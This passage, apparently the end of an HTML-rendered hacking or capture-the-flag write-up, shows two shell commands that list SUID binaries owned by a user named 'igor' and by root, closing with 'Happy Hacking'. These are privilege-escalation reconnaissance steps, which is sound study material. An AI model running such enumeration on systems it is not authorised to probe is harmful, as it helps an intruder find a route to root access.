+<pre><code>                                   <span class="hljs-number">1</span>.find / -<span class="hljs-keyword">user</span> <span class="hljs-title">igor</span> -perm -<span class="hljs-number">4000</span> -print <span class="hljs-number">2</span>&gt;/dev/null
+
+                                   <span class="hljs-number">2</span>.find / -<span class="hljs-keyword">user</span> <span class="hljs-title">root</span> -perm -<span class="hljs-number">4000</span> -print <span class="hljs-number">2</span>&gt;/dev/null
+</code></pre><h4 id="-happy-hacking-">😍Happy Hacking 😍</h4>
+</body></html>
